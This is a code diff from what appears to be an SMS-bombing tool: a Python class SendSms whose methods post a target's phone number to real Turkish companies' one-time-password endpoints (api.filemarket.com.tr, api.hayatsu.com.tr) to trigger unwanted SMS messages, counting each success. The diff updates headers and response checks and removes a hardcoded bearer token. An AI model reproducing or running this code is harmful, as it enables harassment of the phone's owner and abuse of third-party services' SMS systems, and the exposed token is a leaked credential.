@@ -75,15 +75,15 @@ class SendSms():
 
     def File(self):
         try:
-            url = "https://api.filemarket.com.tr:443/v1/otp/send"
-            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
-            json={"mobilePhoneNumber": f"90{self.phone}"}
+            url = "https://api.filemarket.com.tr/v1/otp/send"
+            headers = {"Content-Type": "application/json", "User-Agent": "filemarket/1.7"}
+            json = {"mobilePhoneNumber": f"90{self.phone}"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.json()["responseType"] == "SUCCESS":
+            if r.json().get("responseType") == "SUCCESS":
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
                 self.adet += 1
             else:
-                raise
+                raise Exception
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")
 
@@ -293,39 +293,17 @@ class SendSms():
 
     def Hayatsu(self):
         try:
-            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
-            headers = {
-                "User-Agent":
-                "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
-                "Accept": "application/json, text/javascript, */*; q=0.01",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Accept-Encoding": "gzip, deflate, br",
-                "Referer": "https://www.hayatsu.com.tr/",
-                "Content-Type":
-                "application/x-www-form-urlencoded; charset=UTF-8",
-                "Authorization":
-                "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM",
-                "Origin": "https://www.hayatsu.com.tr",
-                "Dnt": "1",
-                "Sec-Gpc": "1",
-                "Sec-Fetch-Dest": "empty",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Site": "same-site",
-                "Te": "trailers"
-            }
-            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
-            r = requests.post(url, headers=headers, data=data, timeout=6)
-            if r.json()["is_success"] == True:
-                print(
-                    f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hayatsu.com.tr"
-                )
+            url = "https://api.hayatsu.com.tr/api/SignUp/SendOtp"
+            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
+            json = {"mobilePhoneNumber": self.phone, "actionType": "register"}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hayatsu.com.tr")
                 self.adet += 1
             else:
-                raise Exception("API Error")
-        except Exception as e:
-            print(
-                f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hayatsu.com.tr"
-            )
+                raise Exception
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hayatsu.com.tr")
 
     def Ucdortbes(self):
         try:
